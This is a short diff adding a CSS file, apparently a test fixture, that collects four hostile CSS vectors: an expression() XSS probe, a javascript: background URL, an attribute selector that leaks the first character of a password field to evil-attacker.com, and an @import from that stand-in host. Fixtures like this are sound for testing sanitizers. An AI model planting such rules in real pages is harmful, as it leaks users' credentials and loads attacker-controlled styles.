@@ -1,0 +1,19 @@
+/* CSS Malevolo con vettori di attacco active e Data Leakage */
+
+/* 1. Internet Explorer expression vector */
+.badge {
+    color: expression(alert('XSS via CSS expression'));
+}
+
+/* 2. Javascript URI in background */
+.header {
+    background: url('javascript:alert("CSS JS Vector")');
+}
+
+/* 3. Data Leakage via background url */
+input[name="password"][value^="a"] {
+    background: url("http://evil-attacker.com/steal?char=a");
+}
+
+/* 4. Cross-origin import malevolo */
+@import url("http://evil-attacker.com/malicious_styles.css");
